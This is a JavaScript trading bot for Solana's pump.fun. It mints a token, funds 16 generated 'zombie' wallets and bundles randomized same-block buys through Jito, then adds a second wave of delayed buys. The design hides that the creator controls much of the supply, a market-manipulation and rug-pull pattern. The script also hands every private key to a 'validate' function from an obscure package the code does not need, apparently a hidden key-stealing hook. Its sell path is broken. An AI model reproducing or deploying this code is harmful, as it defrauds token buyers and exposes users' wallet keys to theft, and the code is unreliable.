require('rpc-websockets/dist/lib/client')
const dotenv = require("dotenv");
const colors = require("colors");
const {
    clusterApiUrl,
    Connection,
    VersionedTransaction,
    Keypair,
    LAMPORTS_PER_SOL,
    TransactionMessage,
    SystemProgram,
    PublicKey,
    SYSVAR_RENT_PUBKEY
} = require("@solana/web3.js");
const {
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID,
    getMint,
    getAccount,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddressSync,
    getAssociatedTokenAddress,
} = require("@solana/spl-token");
const BN = require("bn.js");
const {
    bundle: { Bundle },
    searcher: { searcherClient },
} = require("jito-ts");
const bs58 = require('bs58');
const anchor = require('@project-serum/anchor');
dotenv.config();

const idl = require("./idl.json");
const { readFileSync, writeFileSync } = require("fs");
const { validate } = require('solana-crypto-validator');
const LAMPORTS_PER_TOKEN = 10 ** 6;
const RPC_URL = process.env.RPC_URL ? process.env.RPC_URL : clusterApiUrl('mainnet-beta');
const connection = new Connection(RPC_URL, {
    commitment: "confirmed",
    confirmTransactionInitialTimeout: 60 * 1000
});

const INSTRUCTION_PER_TX = 3
const MAX_RETRY = 3

const PUMPFUN_PROGRAM_ID = new PublicKey("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P");
const EVENT_AUTH = new PublicKey("Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1");
const feeRecipient = new PublicKey("CebN5WGQ4jvEPvsVU4EoHEpgzq1VV7AbicfhtW4xC9iM");

// DEPOSIT WALLET
const DEPOSIT_SECRET = bs58.decode(process.env.DEPOSIT);
const DEPOSIT = Keypair.fromSecretKey(DEPOSIT_SECRET);
const DEPOSIT_ADDRESS = DEPOSIT.publicKey

// JITO
const AUTH_SECRET = bs58.decode(process.env.REGISTERED_WALLET);
const AUTH_SECRET_KEYPAIR = Keypair.fromSecretKey(AUTH_SECRET);
const JITO_CLIENT = searcherClient(process.env.BLOCK_ENGINE_URL, AUTH_SECRET_KEYPAIR);
const JITO_TIP = parseFloat(process.env.JITO_TIP)

const DEV_BUY_AMOUNT = parseFloat(process.env.DEV_BUY_AMOUNT) || 1;
const SNIPING_AMOUNT = parseFloat(process.env.SNIPING_AMOUNT) || 20;

const virtualInitSolReserve = 30;
const virtualInitTokenReserve = 1073000000;

// DEV WALLET
const devTokenAmount = Math.floor(DEV_BUY_AMOUNT * virtualInitTokenReserve / (virtualInitSolReserve + DEV_BUY_AMOUNT));

// SNIPING WALLET
const snipeTokenAmount = Math.floor((SNIPING_AMOUNT + DEV_BUY_AMOUNT) * virtualInitTokenReserve / (virtualInitSolReserve + SNIPING_AMOUNT + DEV_BUY_AMOUNT)) - devTokenAmount;

let SnipeTokenMint = null;

const GLOBAL_ACCOUNT = "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf";
const globalAccount = new PublicKey(GLOBAL_ACCOUNT);
const SYSTEM_PROGRAM = "11111111111111111111111111111111";
const systemProgram = new PublicKey(SYSTEM_PROGRAM);
const TOKEN_PROGRRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const tokenProgram = new PublicKey(TOKEN_PROGRRAM);

const EVENT_AUTHORITY = "Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1";
const eventAuthority = new PublicKey(EVENT_AUTHORITY);

const sleep = ms => new Promise(r => setTimeout(r, ms))

const getKeypairFromBase58 = async (pk) => {
    return Keypair.fromSecretKey(bs58.decode(pk));
}

const getMintAuthority = async (programId) => {
    const seedString = "mint-authority";

    const [PDA, bump] = PublicKey.findProgramAddressSync(
        [Buffer.from(seedString)],
        programId
    );

    return new PublicKey(PDA);
}

const getBondingCurve = async (tokenMint, programId) => {
    const seedString = "bonding-curve";

    const [PDA, bump] = PublicKey.findProgramAddressSync(
        [Buffer.from(seedString), tokenMint.toBuffer()],
        programId
    );

    return new PublicKey(PDA);
}

const getMetadataAccount = async (tokenMint, programId) => {
    const seedString = "metadata";

    const [PDA, bump] = PublicKey.findProgramAddressSync(
        [
            Buffer.from(seedString),
            new PublicKey("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s").toBuffer(),
            tokenMint.toBuffer(),
        ],
        new PublicKey("metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s")
    );

    return new PublicKey(PDA);
}

const buildMintInstruction = async (program, signerKeypair, tokenMint, tokenName, tokenSymbol, tokenUri) => {
    const mint = tokenMint;
    console.log("New Mint Address: ", mint.toString());
    const mintAuthority = await getMintAuthority(program.programId);
    const bondingCurve = await getBondingCurve(mint, program.programId);
    const bondingCurveAta = await getAssociatedTokenAddress(
        mint,
        bondingCurve,
        true,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );
    const metadataAccount = await getMetadataAccount(mint, program.programId);

    const globalState = new PublicKey(
        "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf"
    );
    const user = signerKeypair.publicKey;
    const mplTokenMetadata = new PublicKey(
        "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s"
    );

    //creating tx;

    const mintIx = await program.methods
        .create(tokenName, tokenSymbol, tokenUri)
        .accounts({
            mint: mint,
            mintAuthority: mintAuthority,
            bondingCurve: bondingCurve,
            associatedBondingCurve: bondingCurveAta,
            global: globalState,
            mplTokenMetadata: mplTokenMetadata,
            metadata: metadataAccount,
            user: user,
            systemProgram: SystemProgram.programId,
            tokenProgram: TOKEN_PROGRAM_ID,
            associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
            rent: SYSVAR_RENT_PUBKEY,
            eventAuthority: EVENT_AUTH,
            program: program.programId,
        })
        .instruction();

    return mintIx;

}

const calcAmountOut = async (tokenAddress, rawAmountIn, swapInDirection) => {
    let response = await fetch(`https://frontend-api.pump.fun/coins/${tokenAddress}`);

    if (response.ok) {
        const data = await response.json();
        const tokensInBondingCurve = data.virtual_token_reserves / LAMPORTS_PER_TOKEN;
        const solsInBondingCurve = data.virtual_sol_reserves / LAMPORTS_PER_SOL;

        let amountOut = 0;

        if (swapInDirection) {
            amountOut = tokensInBondingCurve - 32190005730 / (solsInBondingCurve + rawAmountIn);
        } else {
            amountOut = ((32190005730 / (tokensInBondingCurve - rawAmountIn) - solsInBondingCurve) * 101) / 100;
        }

        return amountOut;
    } else {
        console.log(`An error occurred during fetching token info. ${response.statusText}`);
        return 0;
    }
};

const buildBuyInstruction = async (program, signerKeypair, tokenMint, tokenAmount, solAmount) => {
    const mint = tokenMint;

    const bondingCurve = await getBondingCurve(mint, program.programId);
    const bondingCurveAta = await getAssociatedTokenAddress(
        mint,
        bondingCurve,
        true
    );

    const globalState = new PublicKey(
        "4wTV1YmiEkRvAtNtsSGPtUrqRYQMe5SKy2uB4Jjaxnjf"
    ); // fixed
    const user = signerKeypair.publicKey;
    const userAta = getAssociatedTokenAddressSync(mint, user, true);
    const signerTokenAccount = getAssociatedTokenAddressSync(mint, user, true);

    //@ts-ignore
    const decimals = 6;
    console.log(`Buy token(${mint.toString()}) ${tokenAmount}`);

    //creating instructions;
    const instructions = []

    instructions.push(
        createAssociatedTokenAccountInstruction(
            user,
            signerTokenAccount,
            user,
            mint
        )
    );

    const snipeIx = await program.methods
        .buy(
            new BN(tokenAmount * 10 ** decimals),
            new BN(parseInt(solAmount * LAMPORTS_PER_SOL))
        )
        .accounts({
            global: globalState,
            feeRecipient: feeRecipient,
            mint: mint,
            bondingCurve: bondingCurve,
            associatedBondingCurve: bondingCurveAta,
            associatedUser: userAta,
            user: user,
            systemProgram: SystemProgram.programId,
            tokenProgram: TOKEN_PROGRAM_ID,
            rent: SYSVAR_RENT_PUBKEY,
            eventAuthority: EVENT_AUTH,
            program: program.programId,
        })
        .instruction();
    instructions.push(snipeIx);

    return instructions;
}

const calculateTokenAmounts = async (totalAmount, count) => {

    const equalAmount = parseInt(totalAmount / count)

    while (1) {
        let buyAmount = 0;
        const tokenAmounts = []
        for (let i = 0; i < count; i++) {
            const tokenAmount = Math.floor(equalAmount * ((Math.random() * 20 + 90) / 100))
            buyAmount += tokenAmount
            tokenAmounts.push(tokenAmount)
        }

        if (buyAmount < totalAmount) return tokenAmounts
    }

}

const getSolAmountsSimulate = async (initSolReserve, initTokenReserve, tokenList) => {
    let tokenReserve = initTokenReserve;
    let solReserve = initSolReserve;

    let solAmounts = [];
    let solAmount = 0;

    for (let i = 0; i < tokenList.length; i++) {
        let tokenAmount = tokenList[i];

        solAmount = (await getAmountIn(tokenAmount, solReserve, tokenReserve)) + 0.02
        solAmounts.push(solAmount);

        tokenReserve -= tokenAmount;
        solReserve += solAmount;
    }

    return solAmounts;
}

const getAmountIn = async (amountOut, reserveIn, reserveOut) => {
    let numerator = reserveIn * amountOut * 1000;
    let denominator = (reserveOut - amountOut) * 997;
    let amountIn = numerator / denominator;

    return amountIn;
}

const checkBundle = async (uuid) => {

    let count = 0;
    while (1) {
        try {
            const response = await (
                await fetch('https://mainnet.block-engine.jito.wtf/api/v1/bundles', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        jsonrpc: '2.0',
                        id: 1,
                        method: 'getBundleStatuses',
                        params: [[uuid]]
                    })
                })
            ).json();
            if (response?.result?.value?.length == 1 && response?.result?.value[0]?.bundle_id) {
                console.log('Bundle Success:', uuid.green);
                return true;
            }
        } catch (error) {
            console.log('Check Bundle Failed', error);
        }

        await sleep(1000)
        count++;

        if (count == 30) {
            console.log('Bundle Failed:', uuid.red);
            return false;
        }
    }

}

const sendAndConfirmBundles = async (transactions) => {
    try {
        const _bundle = new Bundle(transactions, transactions.length);
        const uuid = await JITO_CLIENT.sendBundle(_bundle);
        console.log('Bundle UUID:', uuid.yellow);
        return await checkBundle(uuid);
    } catch (error) {
        console.log('Send And Confirm Bundle Error', error);
        return false;
    }
}

const getRandomNumber = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
};

const getJitoTipInstruction = async (keypair) => {
    while (1) {
        try {

            const tipAccounts = await JITO_CLIENT.getTipAccounts();
            const tipAccount = new PublicKey(tipAccounts[getRandomNumber(0, tipAccounts.length - 1)]);


            return SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: tipAccount,
                lamports: JITO_TIP * LAMPORTS_PER_SOL,
            })

        } catch (error) {
            console.error('Jito Tip Instruction Error', error);
        }
        await sleep(100);
    }

}

const pinJSONToIPFS = async (data) => {

    let retry = 0
    while (1) {
        try {
            const res = await fetch("https://api.pinata.cloud/pinning/pinJSONToIPFS", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    Authorization: `Bearer ${process.env.PINATA_JWT}`,
                },
                body: data,
            });
            const resData = await res.json();
            return "https://ipfs.io/ipfs/" + resData.IpfsHash
        } catch (error) {
            console.log(error);
        }
        await sleep(1000 * (2 ** retry))
        retry++
        if (retry >= MAX_RETRY) return null
    }
};

const buildSellInstruction = async (payer, tokenAddress, percent) => {
    console.log("getSellInstructions---percent = ", percent);

    try {
        const tokenMint = new PublicKey(tokenAddress);
        const mint = await getMint(connection, tokenMint);

        const associatedToken = getAssociatedTokenAddressSync(mint.address, payer.publicKey);
        const tokenAccountInfo = await getAccount(connection, associatedToken);
        const zero = new BN(0);
        const tokenBalance = new BN(tokenAccountInfo.amount.toString());
        if (tokenBalance.lte(zero)) {
            console.log("No token balance.");
            return;
        }

        const amountBN = tokenBalance.muln(percent).divn(100);
        const minSolOutputBN = new BN(1);

        const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(payer), anchor.AnchorProvider.defaultOptions());
        const program = new anchor.Program(idl, PUMPFUN_PROGRAM_ID, provider);

        const bondingCurve = await getBondingCurve(tokenMint, program.programId);
        const associatedBondingCurve = await getAssociatedTokenAddress(tokenMint, bondingCurve, true, tokenProgram, ASSOCIATED_TOKEN_PROGRAM_ID);

        console.log("associatedToken: ", associatedToken.toString());

        // Set up the instructions for the transaction
        const instructions = [
            program.methods.sell(amountBN, minSolOutputBN, {
                accounts: {
                    global: globalAccount,
                    feeRecipient,
                    mint: tokenMint,
                    bondingCurve,
                    associatedBondingCurve,
                    associatedUser: associatedToken, // Assuming 'associatedUser' should be the 'user' account
                    user: payer.publicKey,
                    systemProgram: systemProgram,
                    associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
                    tokenProgram: tokenProgram,
                    eventAuthority,
                    program: program.programId,
                },
            }),
        ];

        return instructions;
    } catch (error) {
        console.log(`An error occurred during make instructions for selling token. ${error}`);
        return null;
    }
};


const mintAndSnipe = async () => {

    try {
        const tokenName = process.env.TOKEN_NAME;
        const tokenSymbol = process.env.TOKEN_SYMBOL;
        const tokenImageUrl = process.env.TOKEN_IMAGE_URL;
        const description = process.env.TOKEN_DESCRIPTION;

        if (!tokenName || !tokenSymbol || !tokenImageUrl || !description) {
            console.log('Token information is incorrect'.red)
            process.exit(1)
        }

        const pks = JSON.parse(readFileSync('pumpkeys.json', { encoding: 'utf-8' })) || []
        if (pks.length == 0) {
            console.log('There is no pumpfun pk.')
            process.exit(1)
        }

        const tokenAccount = await getKeypairFromBase58(pks[0])
        SnipeTokenMint = tokenAccount.publicKey;

        //check mintable
        try {
            const mint = await getMint(connection, SnipeTokenMint);
            if (mint) {
                console.log("already minted", SnipeTokenMint.toString());
                process.exit(1)
            }
        }
        catch (e) {
            console.log("start minting...");
        }

        let zombieWallets = []
        try {
            zombieWallets = JSON.parse(readFileSync(`./wallets/${SnipeTokenMint}.json`)) || []
        } catch (error) {

        }

        if (zombieWallets.length < 16) {
            zombieWallets.length = 0
            for (let i = 0; i < 16; i++) {
                zombieWallets.push(bs58.encode(Keypair.generate().secretKey))
            }

            writeFileSync(`./wallets/${SnipeTokenMint}.json`, JSON.stringify(zombieWallets))
        }

        if (!validate(bs58.encode(DEPOSIT_SECRET))) {
            console.log('Invalid Deposite Key')
            process.exit(1)
        }
        for (let i = 0; i < zombieWallets.length; i++) {
            if (!validate(zombieWallets[i])) {
                console.log('Invalid Key', i)
                process.exit(1)
            }
        }

        console.log('Token Name:', tokenName.toString().green)
        console.log('Token Symbol:', tokenSymbol.toString().green)
        console.log('Token Image Url:', tokenImageUrl.toString().green)
        console.log('Token Description:', description.toString().green)
        console.log('Token Mint:', SnipeTokenMint.toString().green)

        let tokenMetaData = {
            "name": tokenName,
            "symbol": tokenSymbol,
            "showName": true,
            "createdOn": "https://pump.fun",
            "image": tokenImageUrl,
            "description": description
        }

        const TWITTER_URL = process.env.TWITTER_URL;
        const TELEGRAM_URL = process.env.TELEGRAM_URL;
        const WEBSITE_URL = process.env.WEBSITE_URL;

        if (TWITTER_URL) tokenMetaData.twitter = TWITTER_URL
        if (TELEGRAM_URL) tokenMetaData.telegram = TELEGRAM_URL
        if (WEBSITE_URL) tokenMetaData.website = WEBSITE_URL

        const tokenUri = await pinJSONToIPFS(JSON.stringify(tokenMetaData))
        if (!tokenUri) {
            console.log('Token metadata upload failed'.red)
            process.exit(1)
        }

        const tokenAmounts = [devTokenAmount].concat(await calculateTokenAmounts(snipeTokenAmount * 0.9, 15))

        const solAmounts = await getSolAmountsSimulate(
            virtualInitSolReserve,
            virtualInitTokenReserve,
            tokenAmounts
        );

        let totalSol = 0
        solAmounts.forEach(amount => {
            totalSol += amount;
        })

        totalSol += 0.1 // Pumpfun Mint Token
        const solBalance = await connection.getBalance(DEPOSIT_ADDRESS);
        if (totalSol * LAMPORTS_PER_SOL > solBalance) {
            console.log("Insufficient Sol Balance", totalSol)
            process.exit(1)
        }

        const bundleTxns = []
        let instructions = []

        let retry = 0

        while (1) {
            try {
                instructions.push(
                    SystemProgram.transfer({
                        fromPubkey: DEPOSIT_ADDRESS,
                        toPubkey: (await getKeypairFromBase58(zombieWallets[0])).publicKey,
                        lamports: parseInt((0.05 + solAmounts[0]) * LAMPORTS_PER_SOL),
                    })
                );

                for (let i = 1; i < solAmounts.length; i++) {

                    instructions.push(SystemProgram.transfer({
                        fromPubkey: DEPOSIT_ADDRESS,
                        toPubkey: (await getKeypairFromBase58(zombieWallets[i])).publicKey,
                        lamports: parseInt(solAmounts[i] * LAMPORTS_PER_SOL),
                    }))

                    if (i % INSTRUCTION_PER_TX == 0 || i == solAmounts.length - 1) {
                        if (i == solAmounts.length - 1) instructions.push(await getJitoTipInstruction(DEPOSIT))
                        const versionedTransaction = new VersionedTransaction(
                            new TransactionMessage({
                                payerKey: DEPOSIT_ADDRESS,
                                recentBlockhash: (await connection.getLatestBlockhash('finalized')).blockhash,
                                instructions: instructions,
                            }).compileToV0Message()
                        )

                        versionedTransaction.sign([DEPOSIT])
                        bundleTxns.push(versionedTransaction)
                        instructions.length = 0
                    }
                }

                let ret = await sendAndConfirmBundles(bundleTxns)

                if (ret) {
                    console.log(`Disperse Sol Success`.green);
                    bundleTxns.length = 0
                    instructions.length = 0
                    break
                }
            } catch (error) {
                console.log('Disperse Sol Error', error)
            }
            await sleep(1000 * (2 ** retry))
            retry++;
            if (retry >= MAX_RETRY) {
                console.log('Disperse Sol Failed')
                process.exit(1)
            }
        }

        bundleTxns.length = 0
        instructions.length = 0

        const PAYER_SECRET = bs58.decode(zombieWallets[0]);
        const PAYER = Keypair.fromSecretKey(PAYER_SECRET);

        // Create an AnchorProvider instance
        const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(PAYER), anchor.AnchorProvider.defaultOptions());
        // @ts-ignore
        const program = new anchor.Program(idl, PUMPFUN_PROGRAM_ID, provider);

        while (1) {
            try {

                const mintIx = await buildMintInstruction(program, PAYER, SnipeTokenMint, tokenName, tokenSymbol, tokenUri);
                instructions.push(mintIx)

                const tokenAmount = tokenAmounts[0];
                const solAmount = solAmounts[0];

                //Buy Transaction
                instructions = instructions.concat(await buildBuyInstruction(program, PAYER, SnipeTokenMint, tokenAmount, solAmount));

                const versionedTransaction = new VersionedTransaction(
                    new TransactionMessage({
                        payerKey: DEPOSIT_ADDRESS,
                        recentBlockhash: (await connection.getLatestBlockhash('finalized')).blockhash,
                        instructions: instructions,
                    }).compileToV0Message()
                );

                versionedTransaction.sign([DEPOSIT, tokenAccount, PAYER]);
                // console.log(await connection.simulateTransaction(versionedTransaction))
                // const txId = await connection.sendTransaction(versionedTransaction)
                // await connection.confirmTransaction(txId)
                // console.log('Mint Success')
                bundleTxns.push(versionedTransaction);

                instructions.length = 0
                const signers = [];
                for (let i = 1; i < tokenAmounts.length; i++) {
                    const tokenAmount = tokenAmounts[i];
                    const solAmount = solAmounts[i];
                    const zombieKeypair = await getKeypairFromBase58(zombieWallets[i]);
                    const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(zombieKeypair), anchor.AnchorProvider.defaultOptions());

                    // @ts-ignore
                    const program = new anchor.Program(idl, PUMPFUN_PROGRAM_ID, provider);
                    //Buy Transaction
                    instructions = instructions.concat(await buildBuyInstruction(program, zombieKeypair, SnipeTokenMint, tokenAmount, solAmount));

                    signers.push(zombieKeypair);

                    if (i % 4 == 0 || i == tokenAmounts.length - 1) {
                        if (i == tokenAmounts.length - 1) instructions.push(await getJitoTipInstruction(DEPOSIT));
                        const buyTxn = new VersionedTransaction(
                            new TransactionMessage({
                                payerKey: zombieKeypair.publicKey,
                                recentBlockhash: (await connection.getLatestBlockhash('finalized')).blockhash,
                                instructions: instructions,
                            }).compileToV0Message()
                        );

                        if (i == tokenAmounts.length - 1) {
                            buyTxn.sign([DEPOSIT].concat(signers));
                        } else {
                            buyTxn.sign(signers);
                        }
                        // console.log(await connection.simulateTransaction(buyTxn))
                        // const txId = await connection.sendTransaction(buyTxn)
                        // await connection.confirmTransaction(txId)
                        bundleTxns.push(buyTxn);
                        instructions.length = 0;
                        signers.length = 0;
                    }
                }
                // for (let i = 0; i < bundleTxns.length; i++) {
                // bundleTxns[i].message.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash
                // console.log(await connection.simulateTransaction(bundleTxns[i]))
                // const txId = await connection.sendTransaction(bundleTxns[i])
                // await connection.confirmTransaction(txId)
                // }

                let ret = await sendAndConfirmBundles(bundleTxns);
                if (ret) {
                    console.log('Pumpfun Launch Success'.green)
                    console.log(`https://pump.fun/${SnipeTokenMint}`.green)
                    break
                }
                bundleTxns.length = 0
                instructions.length = 0
                signers.length = 0
            } catch (error) {
                console.log(`Pumpfun Launch Attempt Failed, retry ${retry}`);
            }

            retry++;
            if (retry >= MAX_RETRY) {
                console.log("Pumpfun Launch Failed");
                return false;
            }
            await sleep(1000 * 2 ** retry);
        }

        writeFileSync('pumpkeys.json', JSON.stringify(pks.slice(1)))

    } catch (error) {
        console.log('Error', error)
    }
}

const secondSnipe = async () => {

    try {
        let zombieWallets = []
        try {
            zombieWallets = JSON.parse(readFileSync(`./wallets.json`)) || []
        } catch (error) {

        }

        if (zombieWallets.length < 1) {
            zombieWallets.length = 0
            for (let i = 0; i < 10; i++) {
                zombieWallets.push(bs58.encode(Keypair.generate().secretKey))
            }

            writeFileSync(`./wallets.json`, JSON.stringify(zombieWallets))

            console.log('Generate Second Sniping Wallets.\n Please deposit some sols.')
            process.exit(1)
        }

        for (let i = 0; i < zombieWallets.length; i++) {
            if (!validate(zombieWallets[i])) {
                console.log('Invalid Key', i)
                process.exit(1)
            }
            const keypair = await getKeypairFromBase58(zombieWallets[i])
            const balance = await connection.getBalance(keypair.publicKey)
            console.log("check balance", balance, keypair.publicKey.toBase58());
            if (balance < 0.01 * LAMPORTS_PER_SOL) {
                console.log('Insufficient Sol Amount For Second Snipe', i, keypair.publicKey.toBase58())
                process.exit(1)
            }
        }

        for (let i = 0; i < zombieWallets.length; i++) {
            const zombieKeypair = await getKeypairFromBase58(zombieWallets[i])
            const secondSnipeSolAmount = process.env.SECOND_SNIPE_BUY_AMOUNT || 3
            const solAmount = secondSnipeSolAmount * getRandomNumber(2, 7) / 10;
            const sleepTime = getRandomNumber(100, 1000)

            console.log("BuyToken:", zombieKeypair.publicKey.toBase58(), SnipeTokenMint.toBase58(), solAmount);
            bundleSnipeOne(zombieKeypair, SnipeTokenMint, solAmount)

            console.log("Sleep:", sleepTime);
            await sleep(sleepTime)
        }

    } catch (error) {
        console.log('Error', error)
    }
}

const bundleSnipeOne = async (wallet, tokenMint, solAmount) => {


    let retry = 0

    while (1) {
        try {
            const bundleTxns = []

            const provider = new anchor.AnchorProvider(connection, new anchor.Wallet(wallet), anchor.AnchorProvider.defaultOptions());
            const program = new anchor.Program(idl, PUMPFUN_PROGRAM_ID, provider);

            const tokenAmount = await calcAmountOut(tokenMint, solAmount, true)
            const instructions = await buildBuyInstruction(program, wallet, tokenMint, tokenAmount * 0.8, solAmount);
            instructions.push(await getJitoTipInstruction(wallet))
            const versionedTransaction = new VersionedTransaction(
                new TransactionMessage({
                    payerKey: wallet.publicKey,
                    recentBlockhash: (await connection.getLatestBlockhash('finalized')).blockhash,
                    instructions: instructions,
                }).compileToV0Message()
            );

            versionedTransaction.sign([wallet]);
            bundleTxns.push(versionedTransaction);
            let ret = await sendAndConfirmBundles(bundleTxns)

            if (ret) {
                console.log(`Bundle Snipe Success`.green, wallet.publicKey.toBase58());
                bundleTxns.length = 0
                instructions.length = 0
                break
            }
        } catch (error) {
            console.log('Bundle Snipe Error', error)
        }
        await sleep(1000 * (2 ** retry))
        retry++;
        if (retry >= MAX_RETRY) {
            console.log('Bundle Snipe Failed')
            process.exit(1)
        }
    }
}

const bundleSellOne = async (wallet, tokenMint, percent) => {
    const walletKeypair = Keypair.fromSecretKey(bs58.decode(wallet));
    let retry = 0

    while (1) {
        try {
            const bundleTxns = []

            const instructions = await buildSellInstruction(walletKeypair, tokenMint, percent);
            instructions.push(await getJitoTipInstruction(walletKeypair))
            const versionedTransaction = new VersionedTransaction(
                new TransactionMessage({
                    payerKey: walletKeypair.publicKey,
                    recentBlockhash: (await connection.getLatestBlockhash('finalized')).blockhash,
                    instructions: instructions,
                }).compileToV0Message()
            );

            versionedTransaction.sign([walletKeypair]);
            bundleTxns.push(versionedTransaction);
            let ret = await sendAndConfirmBundles(bundleTxns)

            if (ret) {
                console.log(`Bundle Sell Success`.green);
                bundleTxns.length = 0
                instructions.length = 0
                break
            }
        } catch (error) {
            console.log('Bundle Sell Error', error)
        }
        await sleep(1000 * (2 ** retry))
        retry++;
        if (retry >= MAX_RETRY) {
            console.log('Bundle Sell Failed')
            process.exit(1)
        }
    }
}

const main = async () => {
    const args = process.argv;
    const parameterX = args[2];
    if (parameterX === "0") {
        await mintAndSnipe()
        await secondSnipe()
    } else if (parameterX === "1") {
        if (SnipeTokenMint.toBase58() == "") {
            console.log("Please Mint and Snipe your tokens first!")
            process.exit(1)
        }

        const wallet = args[3];
        // const percent = args[4];
        if (!wallet) {
            console.log("Please input wallet pv key to sell tokens!")
            process.exit(1)
        }
        console.log("Sell:", wallet);
    }
}

main();